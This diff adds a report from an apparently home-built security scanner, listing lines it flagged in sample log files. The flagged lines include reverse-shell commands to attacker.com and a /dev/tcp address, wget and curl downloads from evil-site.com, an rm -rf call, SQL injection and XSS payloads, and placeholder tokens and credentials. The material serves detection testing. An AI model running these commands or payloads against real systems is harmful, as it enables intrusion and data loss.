@@ -1,0 +1,56 @@
+Line 0 | MEDIUM |suspicious_filename | Suspicious filename: urgent_payroll_password.txt
+Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt
+Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
+------------------------------------------------------------
+Total Matches: 1
+HIGH: 0
+MEDIUM: 1
+LOW: 0
+
+Line 3 | HIGH |sql_injection_payload | ERROR SQL injection attempt detected: ' OR 1=1 --
+Line 5 | HIGH |github_token | WARN admin token exposed: ghp_exampletoken
+Line 10 | HIGH |password | admin password is secret
+Line 11 | HIGH |password_assignment | password=12345
+Line 12 | HIGH |weak_password | INFO AWS key found: AKIA1234567890ABCDE
+Line 13 | HIGH |weak_password | AWS key leaked: AKIA1234567890ABCDEF
+Line 17 | HIGH |github_token | GitHub token leaked: ghp_abcdefghijklmnoprstuvwxyz123
+Line 18 | HIGH |sql_injection_payload | WARN Login attempt username=admin' OR 1=1 --
+Line 19 | HIGH |password | WARN SQL attack detected: UNION SELECT password FROM users
+Line 21 | HIGH |sql_injection_payload | WARN BODY exploit: <body onload=alert('xss')>
+Line 22 | HIGH |weak_password | WARN Weak password detected: password123
+Line 23 | HIGH |weak_password | WARN Admin login using admin123
+Line 24 | HIGH |admin_endpoint | WARN Admin endpoint accessed: /admin/dashboard
+Line 27 | HIGH |os_system_usage | WARN Shell execution detection: os.system(cmd)
+Line 31 | HIGH |download_activity | WARN wget http://evil-site.com/backdoor.sh
+Line 32 | HIGH |reverse_shell | WARN nc -e /bin/sh attacker.com 4444
+Line 33 | HIGH |os_system_usage | WARN Shell execution detected: os.system("rm -rf")
+Line 36 | HIGH |sql_injection_payload | ERROR XSS payload: javascript:alert('owned')
+Line 37 | HIGH |weak_password | ERROR User account using qwerty password
+Line 39 | HIGH |default_credentials | ERROR Default credentials detected admin:admin
+Line 40 | HIGH |sql_injection_payload | ERROR Possible login bypass attempt: ' OR 1=1 --
+Line 41 | HIGH |pickle_loads | ERROR Unsafe deserialization: pickle.loads(user_data)
+Line 42 | HIGH |sql_injection_payload | ERROR SQL injection attempt detected: ' OR 1=1 --
+Line 44 | HIGH |eval_usage | CRITICAL Dangerous eval detected: eval(user_input)
+Line 45 | HIGH |powershell | ALERT powershell.exe -ExecutionPolicy Bypass
+Line 46 | HIGH |download_activity | ALERT curl http://evil-site.com/malware.exe
+Line 6 | MEDIUM |xss | ERROR XSS payload: <script>alert(1)</script>
+Line 15 | MEDIUM |hardcore_login | INFO username="test_user"
+Line 20 | MEDIUM |xss | WARN IMG exploit: <img src=x onerror=alert(1)>
+Line 25 | MEDIUM |debug_endpoint | WARN Debug endpoint exposed: /debug/config
+Line 34 | MEDIUM |admin | WARN User attempt access to admin_panel
+Line 35 | MEDIUM |admin | WARN Unauthorized access to admin_panel
+Line 43 | MEDIUM |xss | ERROR XSS payload: <script>alert(1)</script>
+Line 1 | LOW |ip_address | INFO User login success user=alice ip=10.0.0.5
+Line 2 | LOW |ip_address | WARN Failed password attempt user=bob ip=10.0.0.9
+Line 8 | LOW |email | INFO Contact admin@test.com immediately
+Line 9 | LOW |api_endpoint | INFO Request made to /api/users/profile
+Line 14 | LOW |ip_address | INFO Suspicious login from 192.168.1.25
+Line 47 | LOW |ip_address | ALERT bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
+Scan report for: /Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt
+Keywords: password, token, sql, injection, xss, admin, secret, apikey, api key
+------------------------------------------------------------
+Total Matches: 39
+HIGH: 26
+MEDIUM: 7
+LOW: 6
+
